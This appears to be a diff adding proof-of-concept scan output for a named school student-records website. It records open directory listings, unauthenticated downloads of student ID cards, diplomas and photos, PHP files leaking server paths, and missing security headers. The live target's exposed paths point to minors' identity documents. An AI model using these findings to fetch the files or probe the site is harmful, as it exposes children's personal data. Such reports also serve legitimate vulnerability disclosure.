@@ -1,0 +1,65 @@
+# PoC SISWA MGKB — unauth exposure
+# base: https://pcmgkb.my.id/siswamugeb
+
+## F2 — Directory listing (autoindex)
+  [LISTING] files/  status=200  files=0
+  [LISTING] include/  status=200  files=0
+  [LISTING] images/  status=200  files=69
+  [LISTING] styles/  status=200  files=0
+  [LISTING] files/files_ktp/  status=200  files=8
+  [LISTING] files/files_ijazah/  status=200  files=4
+  [LISTING] files/files_fotosiswa/  status=200  files=174
+  [LISTING] files/files_barang/  status=200  files=0
+
+## F1 — Unduhan PII tanpa autentikasi (KTP / ijazah / foto)
+  [200] files/files_ktp/175…j5.jpg  type=image/jpeg  bytes=2097528
+  [200] files/files_ktp/3EB…m.jpeg  type=image/jpeg  bytes=700045
+  [200] files/files_ktp/583…j.jpeg  type=image/jpeg  bytes=14588
+  [200] files/files_ktp/fil…j0.png  type=image/png  bytes=2277
+  [200] files/files_ktp/IMG…3n.jpg  type=image/jpeg  bytes=80248
+  [200] files/files_ktp/KIA…n2.jpg  type=image/jpeg  bytes=793994
+  [200] files/files_ktp/KIA…8d.jpg  type=image/jpeg  bytes=660647
+  [200] files/files_ktp/ZF-…lw.pdf  type=application/pdf  bytes=85790
+  [200] files/files_ijazah/664…z.jpeg  type=image/jpeg  bytes=791701
+  [200] files/files_ijazah/C68…h.jpeg  type=image/jpeg  bytes=836232
+  [200] files/files_ijazah/fil…i1.png  type=image/png  bytes=2277
+  [200] files/files_ijazah/ZF-…2i.pdf  type=application/pdf  bytes=194481
+  [200] files/files_fotosiswa/202…se.jpg  type=image/jpeg  bytes=3168077
+  [200] files/files_fotosiswa/245…2.jpeg  type=image/jpeg  bytes=1279672
+  [200] files/files_fotosiswa/98C…1.jpeg  type=image/jpeg  bytes=700045
+  [200] files/files_fotosiswa/Abd…ks.JPG  type=image/jpeg  bytes=3489496
+  [200] files/files_fotosiswa/Adi…p2.JPG  type=image/jpeg  bytes=2849833
+  [200] files/files_fotosiswa/Adi…nc.JPG  type=image/jpeg  bytes=3161998
+  [200] files/files_fotosiswa/Ais…td.JPG  type=image/jpeg  bytes=3156217
+  [200] files/files_fotosiswa/Aka…u7.JPG  type=image/jpeg  bytes=2827886
+  [200] files/files_fotosiswa/Alb…xp.JPG  type=image/jpeg  bytes=3206238
+  [200] files/files_fotosiswa/Alf…72.JPG  type=image/jpeg  bytes=3274468
+  [200] files/files_fotosiswa/Ali…pe.JPG  type=image/jpeg  bytes=2773322
+  [200] files/files_fotosiswa/Ali…x5.JPG  type=image/jpeg  bytes=3120231
+  [200] files/files_fotosiswa/Alm…11.JPG  type=image/jpeg  bytes=3115608
+  [200] files/files_fotosiswa/Alm…ay.JPG  type=image/jpeg  bytes=3123645
+  [200] files/files_fotosiswa/Alt…8i.JPG  type=image/jpeg  bytes=3344695
+  [200] files/files_fotosiswa/Aly…zu.JPG  type=image/jpeg  bytes=2867791
+  [200] files/files_fotosiswa/Ami…1q.JPG  type=image/jpeg  bytes=3267476
+  [200] files/files_fotosiswa/Ami…l8.JPG  type=image/jpeg  bytes=2782711
+  [200] files/files_fotosiswa/Ami…m6.JPG  type=image/jpeg  bytes=3180877
+  [200] files/files_fotosiswa/Ami…5d.JPG  type=image/jpeg  bytes=3289233
+  [200] files/files_fotosiswa/And…6y.JPG  type=image/jpeg  bytes=3085521
+  [200] files/files_fotosiswa/Ani…t7.JPG  type=image/jpeg  bytes=2654144
+  [200] files/files_fotosiswa/Ann…4o.JPG  type=image/jpeg  bytes=3110813
+  [200] files/files_fotosiswa/Ann…67.JPG  type=image/jpeg  bytes=2917975
+  [200] files/files_fotosiswa/Ari…ak.JPG  type=image/jpeg  bytes=2999406
+
+## F3 — Akses langsung include/*.php -> path absolut + error PHP
+  [200] include/appsettings.php  php_error=True  abs_path=/home2/pcmgkbmy/public_html/siswamugeb/include/appsettings.php
+  [200] include/commonfunctions.php  php_error=True  abs_path=/home2/pcmgkbmy/public_html/siswamugeb/include/commonfunctions.php
+  [200] include/belum_input_pembiasaan_settings.php  php_error=True  abs_path=/home2/pcmgkbmy/public_html/siswamugeb/include/belum_input_pembiasaan_settings.php
+
+## Header keamanan (login.php)
+  MISS x-frame-options: None
+  MISS content-security-policy: None
+  MISS strict-transport-security: None
+  MISS x-content-type-options: None
+  MISS referrer-policy: None
+  MISS permissions-policy: None
+
